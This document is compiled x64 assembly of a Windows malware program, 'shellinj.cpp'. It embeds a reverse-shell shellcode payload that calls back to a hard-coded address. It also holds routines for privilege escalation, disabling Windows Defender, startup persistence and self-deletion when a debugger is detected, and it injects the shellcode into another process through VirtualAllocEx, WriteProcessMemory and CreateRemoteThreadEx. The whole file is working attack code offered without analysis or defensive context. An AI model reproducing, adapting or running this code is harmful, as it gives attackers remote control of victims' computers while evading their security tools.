	.file	"shellinj.cpp"
	.text
	.section	.text$_Z6printfPKcz,"x"
	.linkonce discard
	.globl	_Z6printfPKcz
	.def	_Z6printfPKcz;	.scl	2;	.type	32;	.endef
	.seh_proc	_Z6printfPKcz
_Z6printfPKcz:
.LFB9:
	pushq	%rbp
	.seh_pushreg	%rbp
	pushq	%rbx
	.seh_pushreg	%rbx
	subq	$56, %rsp
	.seh_stackalloc	56
	leaq	48(%rsp), %rbp
	.seh_setframe	%rbp, 48
	.seh_endprologue
	movq	%rcx, 32(%rbp)
	movq	%rdx, 40(%rbp)
	movq	%r8, 48(%rbp)
	movq	%r9, 56(%rbp)
	leaq	40(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rbx
	movl	$1, %ecx
	movq	__imp___acrt_iob_func(%rip), %rax
	call	*%rax
	movq	%rax, %rcx
	movq	32(%rbp), %rax
	movq	%rbx, %r8
	movq	%rax, %rdx
	call	__mingw_vfprintf
	movl	%eax, -4(%rbp)
	movl	-4(%rbp), %eax
	addq	$56, %rsp
	popq	%rbx
	popq	%rbp
	ret
	.seh_endproc
	.globl	ucReverseShell
	.data
	.align 32
ucReverseShell:
	.ascii "\374H\203\344\360\350\314\0\0\0AQAPRQVH1\322eH\213R`H\213R\30H\213R H\17\267JJM1\311H\213rPH1\300\254<a|\2, A\301\311\15A\1\301\342\355RAQH\213R \213B<H\1\320f\201x\30\13\2\17\205r\0\0\0\213\200\210\0\0\0H\205\300tgH\1\320D\213@ I\1\320\213H\30P\343VH\377\311A\213"
	.ascii "4\210H\1\326M1\311H1\300A\301\311\15\254A\1\301"
	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210AXAX^H\1\320YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351K\377\377\377]I\276ws2_32\0\0AVI\211\346H\201\354\240\1\0\0I\211\345I\274\2\0\21\\\254\23;6ATI\211\344L\211\361A\272Lw&\7\377\325L\211\352h\1\1\0\0YA\272)\200k\0\377\325j\12A^PPM1\311M1\300H\377\300H\211\302H\377\300H\211\301A\272\352\17\337\340\377\325H\211\307j\20AXL\211\342H\211\371A\272\231\245ta\377\325\205\300t\12I\377\316u\345\350\37\1\0\0H\203\354\20H\211\342M1\311j\4AXH\211\371A\272\2\331\310_\377\325\203\370\0\17\216m\0\0\0H\203\304 ^\211\366\201\366ZQ\274\202L\215\236\0\1\0\0j@AYh\0\20\0\0AXH\211\362H1\311A\272X\244S\345\377\325H\215\230\0\1\0\0I\211\337SVPM1\311I\211\360H\211\332H\211\371A\272\2\331\310_\377\325H\203\304 \203\370\0}(XAWYh\0@\0\0AXj\0ZA\272\13/\17"
	.ascii "0\377\325WYA\272unMa\377\325I\377\316\351 \377\377\377H\1\303H)\306u\263I\211\376_YAYAV\350\20\0\0\0\\M/\366z\341\330"
	.ascii "5\261"
	.ascii "8`kR\22\300\347^H1\300I\211\370\252\376\300u\373H1\333A\2\34\0H\211\302\200\342\17\2\34\26A\212\24\0A\206\24\30A\210\24\0\376\300u\343H1\333\376\300A\2\34\0A\212\24\0A\206\24\30A\210\24\0A\2\24\30A\212\24\20A0\21I\377\301H\377\311u\333_A\377\347Xj\0Y\273\340\35*\12A\211\332\377\325\0"
	.globl	oDebug
oDebug:
	.byte	1
	.globl	k
	.section .rdata,"dr"
.LC0:
	.ascii "[+]\0"
	.data
	.align 8
k:
	.quad	.LC0
	.globl	i
	.section .rdata,"dr"
.LC1:
	.ascii "[*]\0"
	.data
	.align 8
i:
	.quad	.LC1
	.globl	e
	.section .rdata,"dr"
.LC2:
	.ascii "[-]\0"
	.data
	.align 8
e:
	.quad	.LC2
	.globl	PID
	.bss
	.align 4
PID:
	.space 4
	.globl	TID
	.align 4
TID:
	.space 4
	.globl	rBuffer
	.align 8
rBuffer:
	.space 8
	.globl	hProcess
	.align 8
hProcess:
	.space 8
	.globl	hThread
	.align 8
hThread:
	.space 8
	.def	__main;	.scl	2;	.type	32;	.endef
	.section .rdata,"dr"
	.align 8
.LC3:
	.ascii "%s trying to disable windows defender...\12\0"
	.align 8
.LC4:
	.ascii "%s faild disable windows defender :(\12\0"
	.align 8
.LC5:
	.ascii "%s starting main meoware.exe...\12\0"
.LC6:
	.ascii "%s add to startup \12\0"
	.align 8
.LC7:
	.ascii "%s trying to open handle to process (%ld)\12\0"
	.align 8
.LC8:
	.ascii "%s got a handle to the process\12\\---0x%p\12\0"
	.align 8
.LC9:
	.ascii "%s couldnt get a handle to process (%ld), error : %ld\0"
	.align 8
.LC10:
	.ascii "%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\12\0"
	.align 8
.LC11:
	.ascii "%s wrote %zu-bytes to process memory\12\0"
	.align 8
.LC12:
	.ascii "%s faild to get a handle to the thread , error: %ld \0"
	.align 8
.LC13:
	.ascii "%s got a handle to the thread (%ld),\12[*]to here in %lu micro Sec\12\\ ---0x%p\12 \0"
.LC14:
	.ascii "%s thread finished execution\12\0"
.LC15:
	.ascii "%s cleaning up\12\0"
.LC16:
	.ascii "%s finishd!\12\0"
	.text
	.globl	main
	.def	main;	.scl	2;	.type	32;	.endef
	.seh_proc	main
main:
.LFB8096:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$96, %rsp
	.seh_stackalloc	96
	.seh_endprologue
	movl	%ecx, 16(%rbp)
	movq	%rdx, 24(%rbp)
	call	__main
	movzbl	oDebug(%rip), %eax
	testb	%al, %al
	je	.L4
	movq	__imp_IsDebuggerPresent(%rip), %rax
	call	*%rax
	testl	%eax, %eax
	setne	%al
	testb	%al, %al
	je	.L5
	call	_Z10SelfDeletev
.L5:
	leaq	-32(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_QueryPerformanceFrequency(%rip), %rax
	call	*%rax
	leaq	-8(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_QueryPerformanceCounter(%rip), %rax
	call	*%rax
	call	_Z7get_pidv
	movl	%eax, PID(%rip)
	call	_Z8priv_escv
	movq	k(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC3(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	call	_Z10dis_windefv
	testl	%eax, %eax
	sete	%al
	testb	%al, %al
	je	.L6
	movq	e(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC4(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
.L6:
	movq	i(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC5(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	call	_Z12AddToStartupv
	movq	k(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC6(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movl	PID(%rip), %edx
	movq	i(%rip), %rax
	movl	%edx, %r8d
	movq	%rax, %rdx
	leaq	.LC7(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movl	PID(%rip), %eax
	movl	%eax, %r8d
	movl	$0, %edx
	movl	$2097151, %ecx
	movq	__imp_OpenProcess(%rip), %rax
	call	*%rax
	movq	%rax, hProcess(%rip)
	movq	hProcess(%rip), %rdx
	movq	k(%rip), %rax
	movq	%rdx, %r8
	movq	%rax, %rdx
	leaq	.LC8(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	hProcess(%rip), %rax
	testq	%rax, %rax
	jne	.L7
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	movl	PID(%rip), %ecx
	movq	e(%rip), %rax
	movl	%edx, %r9d
	movl	%ecx, %r8d
	movq	%rax, %rdx
	leaq	.LC9(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movl	$1, %eax
	jmp	.L10
.L7:
	movq	hProcess(%rip), %rax
	movl	$64, 32(%rsp)
	movl	$12288, %r9d
	movl	$652, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_VirtualAllocEx(%rip), %rax
	call	*%rax
	movq	%rax, rBuffer(%rip)
	movq	k(%rip), %rax
	movl	$652, %r8d
	movq	%rax, %rdx
	leaq	.LC10(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	rBuffer(%rip), %rdx
	movq	hProcess(%rip), %rax
	movq	$0, 32(%rsp)
	movl	$652, %r9d
	leaq	ucReverseShell(%rip), %r8
	movq	%rax, %rcx
	movq	__imp_WriteProcessMemory(%rip), %rax
	call	*%rax
	movq	k(%rip), %rax
	movl	$652, %r8d
	movq	%rax, %rdx
	leaq	.LC11(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	rBuffer(%rip), %rax
	movq	%rax, %rcx
	movq	hProcess(%rip), %rax
	leaq	TID(%rip), %rdx
	movq	%rdx, 56(%rsp)
	movq	$0, 48(%rsp)
	movl	$0, 40(%rsp)
	movq	$0, 32(%rsp)
	movq	%rcx, %r9
	movl	$0, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_CreateRemoteThreadEx(%rip), %rax
	call	*%rax
	movq	%rax, hThread(%rip)
	movq	hThread(%rip), %rax
	testq	%rax, %rax
	jne	.L9
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	movq	e(%rip), %rax
	movl	%edx, %r8d
	movq	%rax, %rdx
	leaq	.LC12(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movl	$1, %eax
	jmp	.L10
.L9:
	leaq	-16(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_QueryPerformanceCounter(%rip), %rax
	call	*%rax
	movq	-16(%rbp), %rdx
	movq	-8(%rbp), %rax
	subq	%rax, %rdx
	movq	%rdx, -24(%rbp)
	movq	-24(%rbp), %rax
	imulq	$1000000, %rax, %rax
	movq	%rax, -24(%rbp)
	movq	-24(%rbp), %rax
	movq	-32(%rbp), %rcx
	cqto
	idivq	%rcx
	movq	%rax, -24(%rbp)
	movq	hThread(%rip), %r8
	movl	TID(%rip), %ecx
	movq	k(%rip), %rax
	movq	-24(%rbp), %rdx
	movq	%rdx, 32(%rsp)
	movq	%r8, %r9
	movl	%ecx, %r8d
	movq	%rax, %rdx
	leaq	.LC13(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	hThread(%rip), %rax
	movl	$-1, %edx
	movq	%rax, %rcx
	movq	__imp_WaitForSingleObject(%rip), %rax
	call	*%rax
	movq	k(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC14(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	i(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC15(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movq	hThread(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	leaq	k(%rip), %rax
	movq	%rax, %rcx
	call	free
	leaq	i(%rip), %rax
	movq	%rax, %rcx
	call	free
	leaq	e(%rip), %rax
	movq	%rax, %rcx
	call	free
	movq	k(%rip), %rax
	movq	%rax, %rdx
	leaq	.LC16(%rip), %rax
	movq	%rax, %rcx
	call	_Z6printfPKcz
	movl	$0, %eax
	jmp	.L10
.L4:
	movzbl	oDebug(%rip), %eax
	xorl	$1, %eax
	testb	%al, %al
	je	.L11
	movq	__imp_IsDebuggerPresent(%rip), %rax
	call	*%rax
	testl	%eax, %eax
	setne	%al
	testb	%al, %al
	je	.L12
	call	_Z10SelfDeletev
.L12:
	call	_Z7get_pidv
	movl	%eax, PID(%rip)
	call	_Z8priv_escv
	call	_Z10dis_windefv
	call	_Z12AddToStartupv
	movl	PID(%rip), %eax
	movl	%eax, %r8d
	movl	$0, %edx
	movl	$2097151, %ecx
	movq	__imp_OpenProcess(%rip), %rax
	call	*%rax
	movq	%rax, hProcess(%rip)
	movq	hProcess(%rip), %rax
	testq	%rax, %rax
	jne	.L13
	movl	$1, %eax
	jmp	.L10
.L13:
	movq	hProcess(%rip), %rax
	movl	$64, 32(%rsp)
	movl	$12288, %r9d
	movl	$652, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_VirtualAllocEx(%rip), %rax
	call	*%rax
	movq	%rax, rBuffer(%rip)
	movq	rBuffer(%rip), %rdx
	movq	hProcess(%rip), %rax
	movq	$0, 32(%rsp)
	movl	$652, %r9d
	leaq	ucReverseShell(%rip), %r8
	movq	%rax, %rcx
	movq	__imp_WriteProcessMemory(%rip), %rax
	call	*%rax
	movq	rBuffer(%rip), %rax
	movq	%rax, %rcx
	movq	hProcess(%rip), %rax
	leaq	TID(%rip), %rdx
	movq	%rdx, 56(%rsp)
	movq	$0, 48(%rsp)
	movl	$0, 40(%rsp)
	movq	$0, 32(%rsp)
	movq	%rcx, %r9
	movl	$0, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_CreateRemoteThreadEx(%rip), %rax
	call	*%rax
	movq	%rax, hThread(%rip)
	movq	hThread(%rip), %rax
	testq	%rax, %rax
	jne	.L14
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movl	$1, %eax
	jmp	.L10
.L14:
	movq	hThread(%rip), %rax
	movl	$-1, %edx
	movq	%rax, %rcx
	movq	__imp_WaitForSingleObject(%rip), %rax
	call	*%rax
	movq	hThread(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	leaq	k(%rip), %rax
	movq	%rax, %rcx
	call	free
	leaq	i(%rip), %rax
	movq	%rax, %rcx
	call	free
	leaq	e(%rip), %rax
	movq	%rax, %rcx
	call	free
	movl	$0, %eax
	jmp	.L10
.L11:
	movl	$0, %eax
.L10:
	addq	$96, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.section .rdata,"dr"
_ZNSt8__detail30__integer_to_chars_is_unsignedIjEE:
	.byte	1
_ZNSt8__detail30__integer_to_chars_is_unsignedImEE:
	.byte	1
_ZNSt8__detail30__integer_to_chars_is_unsignedIyEE:
	.byte	1
	.ident	"GCC: (MinGW-W64 x86_64-msvcrt-mcf-seh, built by Brecht Sanders) 13.0.1 20230402 (experimental)"
	.def	__mingw_vfprintf;	.scl	2;	.type	32;	.endef
	.def	_Z10SelfDeletev;	.scl	2;	.type	32;	.endef
	.def	_Z7get_pidv;	.scl	2;	.type	32;	.endef
	.def	_Z8priv_escv;	.scl	2;	.type	32;	.endef
	.def	_Z10dis_windefv;	.scl	2;	.type	32;	.endef
	.def	_Z12AddToStartupv;	.scl	2;	.type	32;	.endef
	.def	free;	.scl	2;	.type	32;	.endef
